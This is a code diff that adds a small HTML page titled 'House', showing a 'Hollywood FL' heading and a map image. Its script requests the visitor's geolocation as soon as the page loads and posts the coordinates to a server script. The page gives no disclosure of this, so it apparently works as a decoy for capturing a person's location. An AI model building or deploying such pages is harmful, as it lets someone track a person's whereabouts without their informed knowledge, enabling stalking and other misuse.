@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>House</title>
+</head>
+<body>
+    <h1>Hollywood FL</h1>
+    <img src="united-states-of-america-detailed-country-map-template-free-vector.jpg" alt="" style="width: 100%; height: 100%;">
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Dërgimi i të dhënave në server me POST
+                    fetch('php.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: `latitude=${latitude}&longitude=${longitude}`
+                    })
+                    .then(response => response.text())
+                    .then(data => alert(data))
+                    .catch(error => console.error("Error:", error));
+                },
+                (error) => {
+                    console.error("Error obtaining location", error);
+                }
+            );
+        } else {
+            alert("Geolocation is not supported by your browser.");
+        }
+    </script>
+</body>
+</html>
